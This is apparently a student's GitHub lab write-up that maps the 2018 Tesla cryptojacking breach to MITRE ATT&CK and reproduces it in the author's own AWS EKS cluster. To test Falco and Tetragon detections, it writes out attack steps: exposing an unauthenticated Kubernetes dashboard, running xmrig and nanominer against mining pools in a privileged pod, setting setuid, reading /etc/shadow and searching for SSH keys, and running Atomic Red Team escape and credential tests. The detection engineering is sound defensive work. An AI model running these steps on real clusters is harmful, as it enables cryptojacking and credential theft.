# 2018 Tesla Data Breach
As part of this task I was required to map the Tesla Data Breach to the MITRE ATT&amp;CK framework. From here I select any <b>2 specific ‘techniques’</b> from the incident and replicate both on a ‘proof of concept’ basis. This will allow me to display my understanding by synthesizing the selected technical techniques.

# Architectural Diagram

![outline](https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/e8913e81-8178-4f98-8474-0243b32fc098)
[Link to Google Diagram](https://docs.google.com/drawings/d/1Vx_12imsuZ7a-8dCVp3JT9yXyzVF4ETjX4Hb5ecpLPw/edit)

## Falco Detections aligned with MITRE ATT&CK Framework

| Falco Detection Rule | Description | Event Source | MITRE ATT&CK Tactic
| :---         |     :---:   |     :---:      |          ---: |
| [Terminal Shell in Container](https://github.com/falcosecurity/rules/blob/c558fc7d2d02cc2c2edc968fe5770d544f1a9d55/rules/falco_rules.yaml#L2060-L2071)   | A shell was used as the entrypoint/exec point into a container with an attached terminal. | Host System Calls | Execution  |
| [Detect crypto miners using the Stratum protocol](https://github.com/falcosecurity/rules/blob/c558fc7d2d02cc2c2edc968fe5770d544f1a9d55/rules/falco_rules.yaml#L2898C9-L2903)    | Miners typically specify the mining pool to connect to with a URI that begins with <b>stratum+tcp</b>  | Host System Calls       | Execution, Command & Control      |
| [Detect outbound connections to common miner pool ports](https://github.com/falcosecurity/rules/blob/c558fc7d2d02cc2c2edc968fe5770d544f1a9d55/rules/falco_rules.yaml#L2889-L2896)    | Miners typically connect to mining pools on common ports.  | Host System Calls       | Execution, Command & Control      |
| [Mining Binary Detected](https://github.com/n1g3ld0ugla5/falco-mining-demo/blob/main/mining-rules.yaml#L3-L50)    | Malicious script or binary detected within pod or host. This rule will be triggered by the <b>execve</b> syscall  | Host System Calls       | Persistence      |
| [List AWS S3 Buckets](https://github.com/falcosecurity/plugins/blob/master/plugins/cloudtrail/rules/aws_cloudtrail_rules.yaml#L355-L371)    | Detect listing of all S3 buckets. In the case of Tesla, those buckets contained sensitive data such as passwords, tokens and telemetry data.  | AWS Cloudtrail Audit Logs       | Credential Access     |
| [Contact EC2 Instance Metadata Service From Container](https://github.com/falcosecurity/rules/blob/c558fc7d2d02cc2c2edc968fe5770d544f1a9d55/rules/falco_rules.yaml#L2382-L2390)    | Detect listing of all S3 buckets. In the case of Tesla, those buckets contained sensitive data such as passwords, tokens and telemetry data.  | Host System Calls       | Lateral Movement    |

## Setting-up the Sanbox

Had to setup an ```AWS-CLI Profile``` in order to interact with AWS services via my local workstation
```
aws configure --profile nigel-aws-profile
export AWS_PROFILE=nigel-aws-profile                                            
aws sts get-caller-identity --profile nigel-aws-profile
aws eks update-kubeconfig --region eu-west-1 --name tesla-cluster
```

![Screenshot 2023-10-20 at 17 04 05](https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/6c24b473-2f72-4707-a58b-4296e704ccce)

Once I had AWS-CLI installed, I created a ```1 node, AWS EKS cluster``` using EKSCTL CLI tool. <br/>
Notice how I use the ```date``` command purely to confirm when those actions were enforced.

```
date
eksctl create cluster tesla-cluster --node-type t3.xlarge --nodes=1 --nodes-min=0 --nodes-max=3 --max-pods-per-node 58
```

![Screenshot 2023-10-20 at 17 08 09](https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/85425963-6ef6-4677-9177-87e548b2e980)

Once the cluster is successfully spun-up, I can scale it down to ```zero nodes``` to bring my compute costs in the cloud down to $0 until I'm ready to do actual work.

```
date
eksctl get cluster
eksctl get nodegroup --cluster tesla-cluster
eksctl scale nodegroup --cluster tesla-cluster --name ng-64004793 --nodes 0
```

<img width="807" alt="Screenshot 2023-10-29 at 12 02 04" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/a9d689b7-bb67-4f4a-a1c7-2e0a5c63e806">

## Exposing an insecure Kubernetes Dashboard

[Kubernetes Dashboard](https://github.com/kubernetes/dashboard/tree/master) is a general purpose, web-based UI for Kubernetes clusters. <br/>
It allows users to manage applications running in the cluster and troubleshoot them, as well as manage the cluster itself.<br/>
<br/>
When Kubernetes dashboard is installed using the recommended settings, both ```authentication``` and ```HTTPS``` are enabled. Sometimes, organizations like Tesla choose to disable authentication or HTTPS. <br/>
<br/>
For example, if Kubernetes dashboard is served behind a proxy, then it's unnecessary to enable authentication when the proxy has its own authentication enabled. <br/>
<br/>
Kubernetes dashboard uses auto-generated certificates for HTTPS, which may cause problems for HTTP client to access. <br/>
The below ```YAML``` manifest is pre-packaged to provide an insecure dashboard with disable authentication and disabled HTTP/s.
```
kubectl apply -f https://vividcode.io/content/insecure-kubernetes-dashboard.yml
```

Still experiencing issues exposing the dashboard via port forwarding:
```
kubectl port-forward svc/kubernetes-dashboard -n kubernetes-dashboard 8443 --insecure-skip-tls-verify
```

The above manifest is a modified version of the deployment of Kubernetes dashboard which has removed the argument ```--auto-generate-certificates``` and has added some extra arguments:

```--enable-skip-login``` <br/>
```--disable-settings-authorizer``` <br/>
```--enable-insecure-login``` <br/>
```--insecure-bind-address=0.0.0.0``` <br/>

<img width="1439" alt="Screenshot 2023-10-21 at 12 41 45" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/e2e3ec87-52fc-4799-aec8-c2e733d1e490">


After this change, Kubernetes dashboard server now starts on ```port 9090 for HTTP```. 
It has also modified the ```livenessProbe``` to use HTTP as the scheme and 9090 as the port. <br/>

#### Accessing the Kubernetes Dashboard

This ```proxy``` command starts a proxy to the Kubernetes API server, and the dashboard should be accessible at <br/>
```http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/.```

<img width="1265" alt="Screenshot 2023-10-21 at 12 49 34" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/f10d9bbc-999d-49df-9766-e917b2c36716">

However, I received the below error at proxy address: <br/>
```"message": "no endpoints available for service \"https:kubernetes-dashboard:\""```

<img width="1265" alt="Screenshot 2023-10-21 at 12 48 29" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/06cfc246-5c1f-4d31-9e1b-380ce5231156">


#### Troubleshooting the Dashboard Issues

Port 9090 is added as the ```containerPort```. Similarly, the Kubernetes Service abstraction for the dashboard opens port 80 and uses ```9090 as the target port```. Accessing the dashboard at ```http://localhost:8001/``` shows all associated paths, and its quite easy to obfuscate credentials from these paths:

<img width="1132" alt="Screenshot 2023-10-21 at 12 58 57" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/0e7847ce-3d39-42f5-a0f9-9d7999bb56d7">

We can even see the underlying EC2 instance associated with the Kubernetes cluster. The ```EU-West-1``` denotes the AWS Region (Ireland) I've installed the EC2 instance, and the IP address of the VM is also present in the name:

<img width="1437" alt="Screenshot 2023-10-21 at 13 02 09" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/614a26d5-a834-4a72-a6a9-b9855e4efa31">

The IP address in the previous OIDC screenshot does not match the private IP of my EC2 instance on AWS <br/>
I will come back to this later to understand how that OIDC address is used for single sign-on:

<img width="1437" alt="Screenshot 2023-10-21 at 13 07 53" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/a1aa21a2-3e7f-426c-a206-f850a85733bd">

Either way, I modified the original deployment script to make sure the Kubernetes Deployment uses a ```LoadBalancer``` service. <br/>
This way, AWS automatically assigns the public IP address for the dashboard service. Allowing it to be accessed publically:

```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/main/public-dashboard.yaml
```


<img width="1437" alt="Screenshot 2023-10-21 at 13 23 54" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/8013ee39-1b8e-4147-8179-1e84f590db89">

Proof that the L7 LB service was created in AWS automatically <br/>
However, there seems to be some health issues preventing me from accessing the dashboard.

<img width="1437" alt="Screenshot 2023-10-21 at 13 36 52" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/73b8c33f-c7da-4fc3-a2ff-040a7d083453">



After you have done this, when Kubernetes dashboard is opened, you can click ```Skip``` in the login page to skip authentication and go to the dashboard directly.

<img width="883" alt="kubernetes_dashboard_skip" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/ba26d2c0-304e-49d7-86d9-64b8a368b05e">

#### Supporting documentation for Kubernetes Dashboard without Authentication

- [Kubernetes Web UI Activation without Authentication](https://medium.com/@sarpkoksal/kubernetes-web-ui-dashboard-activation-without-authentication-e99447c8a71d)
- [Skipping login to allows users to have unrestricted access](https://github.com/kubernetes/dashboard/issues/2412)
- [Bypassing authentication for the local Kubernetes Cluster Dashboard](https://devblogs.microsoft.com/premier-developer/bypassing-authentication-for-the-local-kubernetes-cluster-dashboard/)

## Installing Falco as our SOC solution

Installed Falco via ```Helm``` using the ```--set tty=true``` feature flag to ensure events are handled in real-time. <br/>
By default, only the ```stable``` rules are loaded by Falco, you can install the ```sandbox``` or ```incubating``` rules by referencing them in the Helm chart: <br/>
https://falco.org/docs/reference/rules/default-rules/ <br/>
<br/>
Remove the existing Falco installation with stable rules:
```
helm uninstall falco -n falco
```

Install Falco again with the modified ```falco-sandbox_rules.yaml``` referenced from my own Github repository:
```https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/blob/main/rules/falco-sandbox_rules.yaml```

<br/>
I'm enabling the ```incubation``` and ```sandbox``` rules for the purpose of this assignment:

```
helm install falco -f mitre_rules.yaml falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set auditLog.enabled=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set collectors.kubernetes.enabled=true \
  --set falcosidekick.webui.redis.storageEnabled=false \
  --set "falcoctl.config.artifact.install.refs={falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falcoctl.config.artifact.follow.refs={falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falco.rules_file={/etc/falco/falco-incubating_rules.yaml,/etc/falco/falco-sandbox_rules.yaml}"
kubectl get pods -n falco -o wide
```

<img width="1083" alt="Screenshot 2023-11-03 at 16 47 25" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/efff769d-a034-4a37-a729-d9f61c9ea74f">




- Where the option ```falcoctl.config.artifact.install.refs``` governs which rules are downloaded at startup
- ```falcoctl.config.artifact.follow.refs``` identifies which rules are automatically updated and
- ```falco.rules_file``` indicates which rules are loaded by the engine.


Alternatively, I can just edit the ConfigMap manually (and this might be easier in the end):
```
kubectl edit cm falco-rules -n falco
```

I can inject ```Custom Rules``` via the ```working-rules.yaml``` manifest:
<img width="1177" alt="Screenshot 2023-10-29 at 11 42 58" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/d511fad7-f146-490a-a7d8-39e19e6dcaf5">



I successfully deployed Falco and the associated dashboard <br/>
As seen in the below screenshot, it may go through some crash status changes before running correctly (expected due to lack of priority set):

<img width="653" alt="Screenshot 2023-10-27 at 11 43 33" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/91fa6653-3e9c-4b2c-8263-bf12a78d61f4">



Finally, Port-Foward the Falco Sidekick from Macbook
```
kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802 --insecure-skip-tls-verify
```
Forwarding from 127.0.0.1:2802 -> 2802 Forwarding from [::1]:2802 -> 2802 Handling connection for 2802

<img width="1440" alt="Screenshot 2023-10-27 at 11 56 17" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/eaaace2f-2aaf-4c8c-bd1e-9862ea5b7213">


## Deploying a Test App and Checking Logs

Create an insecure containerized workload with ```privileged=true``` to give unrestricted permissions for the miner:
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/main/tesla-app.yaml
```

Shell into the newly, over-privileged workload:
```
kubectl exec -it tesla-app -- bash
```

<img width="1440" alt="Screenshot 2023-10-27 at 12 02 09" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/ceb56366-359d-4af7-9f3a-c81d2e8485aa">


To test the IDS/SOC tool, I peform one insecure behaviour in ```tab1``` while also check for the Falco log event in ```tab2```:
```
kubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'tesla-app'
```

<img width="1437" alt="Screenshot 2023-10-22 at 13 54 45" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/53c5f3b3-d4c7-4570-b17e-3b1737fc9441">

If you look at the above screenshot, we created a new workload called ```tesla-app```, I've terminal shelled into the workload, and I've the real-time live tail of security incidents showing in terminal 2 window - providing the IDS system works.

#### Supporting documentation for Falco event collect from Kubernetes and Cloud

- [Kubernetes Audit Logs](https://falco.org/docs/event-sources/plugins/kubernetes-audit/)
- [K8s Audit for EKS Logs](https://falco.org/blog/k8saudit-eks-plugin/)
- [Falco on AWS Cloud](https://falco.org/blog/falco-on-aws/)

## Enabling Kubernetes Audit Logs in Falco
To enable Kubernetes audit logs, you need to change the arguments to the ```kube-apiserver``` process to add ```--audit-policy-file``` and ```--audit-webhook-config-file``` arguments and provide files that implement an audit policy/webhook configuration.
<br/><br/>
Below is a step-by-step guide will show you how to configure kubernetes audit logs on minikube and deploy Falco. <br/>
Managed Kubernetes providers, like AWS EKS, usually provide a mechanism to configure the audit system.<br/>
https://falco.org/docs/install-operate/third-party/learning/

## Running a Cryptominer on an insecure workload

```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/main/tesla-app.yaml
```

The adversaries would have terminal shelled into the above workload in order to install the cryptominer.
```
kubectl exec -it tesla-app -- bash
```

Download the ```xmrig``` mining package from the official Github project:
```
curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```

Unzipping the mining binary package
```
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
```

Changing directory to the newly-downloaded miner folder
```
cd xmrig-6.16.4
```

Elevating permissions
```
chmod u+s xmrig
```

```
find / -perm /6000 -type f
```

Tested - and works!
```
./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
```

<img width="1440" alt="Screenshot 2023-10-27 at 12 05 51" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/b7d9123b-f589-4bd3-9e55-1274236c3c9e">

On the right side pane, we can see that all rules are automatically labelled with relevant MITRE ATT&CK context:


<img width="1440" alt="Screenshot 2023-10-27 at 12 06 03" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/392e58ea-357a-44ad-a37c-8b7bb783baec">

After enabling the mining ports and pools rule within my mitre_rules.yaml file, I can see the new domain detection for mining pool:

<img width="1436" alt="Screenshot 2023-11-17 at 11 50 08" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/996f70f8-9dcd-46e8-ae76-7b45df443151">




Testing my own MetaMask wallet using the ```stratum``` protocol outlined by the [Trend Micro](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/tesla-and-jenkins-servers-fall-victim-to-cryptominers#:~:text=Stratum%20bitcoin%20mining%20protocol) researchers:
```
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
```

<img width="1435" alt="Screenshot 2023-10-31 at 19 53 07" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/dad4022c-aa60-45f1-801b-ce1a6adcd47a">

Some rules are specifically disabled within the sandbox manifest file, so we need to enable these separately

<img width="1419" alt="Screenshot 2023-10-31 at 20 03 19" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/feb29583-82e2-443d-be5d-fa9000b6290b">

Maturity rules are coming through, but I need to make some changes either to the ConfigMap or within the custom rules config file:

<img width="1419" alt="Screenshot 2023-11-01 at 11 28 04" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/c360aba5-d580-4c2f-893a-fe9c11fde6d0">




## Custom Rules - Command & Control

Make sure the xmrig process is no longer running
```
top
```
If so, find the ```Process ID``` of the xmrig service:
```
pidof xmrig
```
You can now either kill the process by ```Process Name``` or ```Process ID```
```
killall -9 xmrig
```

## Nanonminer Test Scenario
```
wget https://github.com/nanopool/nanominer/releases/download/v1.4.0/nanominer-linux-1.4.0.tar.gz
```
```
tar -xvzf ./nanominer-linux-1.4.0.tar.gz
```
```
cd nanominer-linux-1.4.0/ 
```
```
nano config.ini
```
```
./nanominer -d
```



### Credential Access

Finding credentials while we are in the container:
```
cat /etc/shadow > /dev/null
find /root -name "id_rsa"
```

### Obfuscating Activity

This is where an attacker would use a Base64 script to evade traditional file-based detection systems <br/>
Shell into the newly-deployed atomic-red workload:
```
kubectl exec -it -n atomic-red deploy/atomicred -- bash
```

Confirm the atomic red scenario was detected (in a second terminal window):
```
kubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Bulk data has been removed from disk'
```

### Detect File Deletion on Host (T1070.004)
Adversaries may delete files left behind by the actions of their intrusion activity. <br/>
Start a Powershell session with `pwsh`:
```
pwsh
```

Atomic Red Tests are all performed via Powershell <br/> 
So it might look a bit weird that I shell into a Linux container in order to perform Pwsh actions.

<img width="736" alt="Screenshot 2023-10-29 at 11 55 01" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/219f7436-7f84-4e1d-ad98-0a5ad5d5ff18">


Load the Atomic Red Team module:
```
Import-Module "~/AtomicRedTeam/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1" -Force
```

Check the details of the TTPs:
```
Invoke-AtomicTest T1070.004 -ShowDetails
```
Check the prerequisites to ensure the test conditions are right:
```
Invoke-AtomicTest T1070.004 -GetPreReqs
```

We will now execute the test. <br/>
This test will attempt to delete individual files, or individual directories. <br/>
This triggers the `Warning bulk data removed from disk` rule by default.
```
Invoke-AtomicTest T1070.004
```

I successfully detected file deletion in the Kubernetes environment:

<img width="1439" alt="Screenshot 2023-10-29 at 11 58 42" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/076c4a75-f6a8-4b01-81e4-3adf06532f84">


### Escape to Host (T1611)
Adversaries may break out of a container to gain access to the underlying host. <br/>
This can allow an adversary access to other containerised resources from the host-level.
```
kubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep Network tool launched in container
```
```
Invoke-AtomicTest T1611
```

### Boot or Logon Initialisation Scripts (T1037.004)
Adversaries can establish persistence by modifying RC scripts which are executed during system startup
```
kubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep Potentially malicious Python script
```
```
Invoke-AtomicTest T1037.004
```

The new detection totally worked. ```Hurrah```!!
<img width="1440" alt="Screenshot 2023-10-30 at 18 27 15" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/348b8441-3b64-4d63-bc68-4e5cad4b5074">


When you’re ready to move on to the next test or wrap things up, you’ll want to `-CleanUp` the test to avoid potentially having problems running other tests.
```
Invoke-AtomicTest T1037.004 -CleanUp
```


### Launch a suspicious network tool in a container

Shell into the same container we used earlier
```
kubectl exec -it tesla-app -- bash
```
Installing a suspicious networking tool like telnet
```
yum install telnet telnet-server -y
```
If this fails, just apply a few modifications to the registry management:
```
cd /etc/yum.repos.d/
sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*
sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*
```
Update the yum registry manager:
```
yum update -y
```
Now, try to install telnet and telnet server from the registry manager:
```
yum install telnet telnet-server -y
```
Just to generate the detection, run telnet:
```
telnet
```

<img width="1436" alt="Screenshot 2023-11-14 at 21 16 33" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/a008ab2c-224b-4b00-9500-62f4e460bcb6">


<img width="1436" alt="Screenshot 2023-11-14 at 21 16 56" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/739a9d27-a76d-47cd-b7bc-4a20a6845adc">

<img width="1436" alt="Screenshot 2023-11-14 at 21 15 59" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/af3e220c-aad9-43d6-ab7b-47ed391a2706">




Let's also test tcpdump to prove the macro is working:
```
yum install tcpdump -y
```
```
tcpdump -D
```
```
tcpdump --version
```
```
tcpdump -nnSX port 443
```


### Exfiltrating Artifacts via the Kubernetes Control Plane
Copy Files From Pod to Local System. <br/>
We have a nginx web server running inside a container. <br/>
Let’s copy the ```index.html file``` (which nginx serves by default) inside the ```/usr/share/nginx/html``` directory to our local system. Run the following command:
```
kubectl cp tesla-app:xmrig-6.16.4-linux-static-x64.tar.gz ~/desktop/xmrig-6.16.4-linux-static-x64.tar.gz
```

<img width="1431" alt="Screenshot 2023-11-01 at 11 33 23" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/44642a1d-a970-496b-ab17-6afa28ce540d">

### T1552.001 - Unsecured Credentials: Credentials In Files
We can use Atomic Red team to ```Find AWS credentials``` in order to move laterally to the cloud
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md#atomic-test-1---find-aws-credentials
```
Invoke-AtomicTest T1552.001 -ShowDetails
```

<img width="825" alt="Screenshot 2023-11-13 at 21 27 36" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/3f444b76-3914-4133-b1aa-9da50f556061">









## Cleanup Helm Deployments
```
helm uninstall falco -n falco
```

<img width="899" alt="Screenshot 2023-10-27 at 14 43 45" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/6e579d96-f21c-4547-a8e6-14b60b338e41">




### AWS Profile Stuff
```
aws configure --profile nigel-aws-profile
export AWS_PROFILE=nigel-aws-profile                                            
aws sts get-caller-identity --profile nigel-aws-profile
aws eks update-kubeconfig --region eu-west-1 --name tesla-cluster
```

<img width="1440" alt="Screenshot 2023-10-22 at 19 53 37" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/4fa455c7-a17d-4f0f-934a-02b0827add9c">

Confirming the detection rules are present in the current, up-to-date rules feed: <br/>
https://thomas.labarussias.fr/falco-rules-explorer/?source=okta

Exposing Falco Sidekick from my EC2 instance:
```
sudo ssh -i "falco-okta.pem" -L 2802:localhost:2802 ubuntu@ec2-**-***-**-***.eu-west-1.compute.amazonaws.com
```

Accessing the Sidekick UI via Localhost
```
http://localhost:2802/events/?since=15min&filter=mitre
```

## Running Atomic Red Team in Kubernetes

Create the network namespace for the atomic red workload
```
kubectl create ns atomic-red
```

Create the deployment using an external image `issif/atomic-red:latest`
```
kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: atomicred
  namespace: atomic-red
  labels:
    app: atomicred
spec:
  replicas: 1
  selector:
    matchLabels:
      app: atomicred
  template:
    metadata:
      labels:
        app: atomicred
    spec:
      containers:
      - name: atomicred
        image: issif/atomic-red:latest
        imagePullPolicy: "IfNotPresent"
        command: ["sleep", "3560d"]
        securityContext:
          privileged: true
      nodeSelector:
        kubernetes.io/os: linux
EOF
```

Note: This creates a pod called `atomicred` in the `atomic-red` network namespace:
```
kubectl get pods -n atomic-red -w | grep atomicred
```

I successfully deployed the ```atomic-red``` container to my environment:
<img width="877" alt="Screenshot 2023-10-29 at 11 50 08" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/4b0261a9-676d-445a-8573-634ae2f38202">


Use  `Vim` to create our custom rules:
```
vi mitre_rules.yaml
```

```
customRules:
  mitre_rules.yaml: |-
    - rule: Base64-encoded Python Script Execution
      desc: >
        This rule detects base64-encoded Python scripts on command line arguments.
        Base64 can be used to encode binary data for transfer to ASCII-only command
        lines. Attackers can leverage this technique in various exploits to load
        shellcode and evade detection.
      condition: >
        spawned_process and (
          ((proc.cmdline contains "python -c" or proc.cmdline contains "python3 -c" or proc.cmdline contains "python2 -c") and
          (proc.cmdline contains "echo" or proc.cmdline icontains "base64"))
          or
          ((proc.cmdline contains "import" and proc.cmdline contains "base64" and proc.cmdline contains "decode"))
        )
      output: >
        Potentially malicious Python script encoded on command line
        (proc.cmdline=%proc.cmdline user.name=%user.name proc.name=%proc.name
        proc.pname=%proc.pname evt.type=%evt.type gparent=%proc.aname[2]
        ggparent=%proc.aname[3] gggparent=%proc.aname[4] evt.res=%evt.res
        proc.pid=%proc.pid proc.cwd=%proc.cwd proc.ppid=%proc.ppid
        proc.pcmdline=%proc.pcmdline proc.sid=%proc.sid proc.exepath=%proc.exepath
        user.uid=%user.uid user.loginuid=%user.loginuid
        user.loginname=%user.loginname group.gid=%group.gid group.name=%group.name
        image=%container.image.repository:%container.image.tag
        container.id=%container.id container.name=%container.name file=%fd.name)
      priority: warning
      tags:
        - ATOMIC_RED_T1037.004
        - MITRE_TA0005_defense_evasion
        - MITRE_T1027_obfuscated_files_and_information
      source: syscall
      append: false
      exceptions:
        - name: proc_cmdlines
          comps:
            - startswith
          fields:
            - proc.cmdline
```

I'm lazy, so I uninstall and reinstall charts rathert than upgrading:
```
helm uninstall falco -n falco
```
Alternative way of testing the new ```mitre_rules.yaml``` file:
```
helm install falco -f mitre_rules.yaml falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set auditLog.enabled=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set collectors.kubernetes.enabled=true \
  --set falcosidekick.webui.redis.storageEnabled=false
```

Let's delete the Falco pod to ensure the changes have been enforced.
```
kubectl delete pod -l app.kubernetes.io/name=falco -n falco
```
Note: A new pod after several seconds. Please be patient.
```
kubectl get pods -n falco -w
```


## Ongoing Issues

Issues with the environment (Making Number of VPCs was reached) - disregard:
<img width="1138" alt="Screenshot 2023-10-25 at 20 40 42" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/cc00fbdd-e239-40e4-bc05-8d5365396bde">

## Deploying the Kubernetes dashboard via Helm

Add kubernetes-dashboard repository
```
helm repo add kubernetes-dashboard https://kubernetes.github.io/dashboard/
```

Deploy a Helm Release named ```kubernetes-dashboard``` using the kubernetes-dashboard chart
```
helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard --create-namespace --namespace kubernetes-dashboard
```
<img width="1284" alt="Screenshot 2023-11-03 at 11 39 14" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/dd3f0e88-709b-40bd-b486-bf9f49a6801e">


### Upgrade the dashboard without authentication
```
helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard --namespace kubernetes-dashboard -f custom-values.yaml
```

Add this context to ```custom-values.yaml```
```
basicAuth:
  enabled: false

args:
  - --enable-skip-login
  - --disable-settings-authorizer
  - --enable-insecure-login
  - --insecure-bind-address=0.0.0.0
```


Copying the kubeconfig file from its rightful location to my desktop:
```
cp ~/.kube/config ~/Desktop/
```

## Install Tetragon

```
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon -n kube-system
kubectl rollout status -n kube-system ds/tetragon -w
```

## Network traffic analysis using Tetragon
Create a TracingPolicy in Tetragon
```
kubectl apply -f https://raw.githubusercontent.com/cilium/tetragon/main/examples/tracingpolicy/tcp-connect.yaml
```

## Tracing via Tetragon

Open an activity tail for Tetragon (Terminal 2):
```
kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f | tetra getevents -o compact --namespace default --pod tesla-app
```
Open an event output for Falco (Terminal 3):
```
kubectl logs --follow -n falco -l app.kubernetes.io/instance=falco | grep k8s.pod=tesla-app
```

<img width="1205" alt="Screenshot 2023-11-18 at 20 31 20" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/c31688f9-5765-4f0c-baae-884451575e78">


## Kill the Miner Processes using Tetragon

Now we apply a Tetragon TracingPolicy that will perform sigkill action when the script is run:
```
https://raw.githubusercontent.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/main/sigkill-miner.yaml
```

<img width="1381" alt="Screenshot 2023-11-18 at 20 40 11" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/02a6f86d-61fb-4537-b7a5-66e75d4bb598">



## Custom Test Scenarios:

Base64 encoding and mining pools. This works!!
```
helm install falco falcosecurity/falco \
  -n falco \
  --version 3.3.0 \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set collectors.kubernetes.enabled=true \
  --set falcosidekick.webui.redis.storageEnabled=false \
  -f mitre_rules.yaml
```

Mining Binary Detection. Pending tests
```
helm install falco falcosecurity/falco \
  -n falco \
  --version 3.3.0 \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set collectors.kubernetes.enabled=true \
  --set falcosidekick.webui.redis.storageEnabled=false \
  -f custom-rules.yaml
```
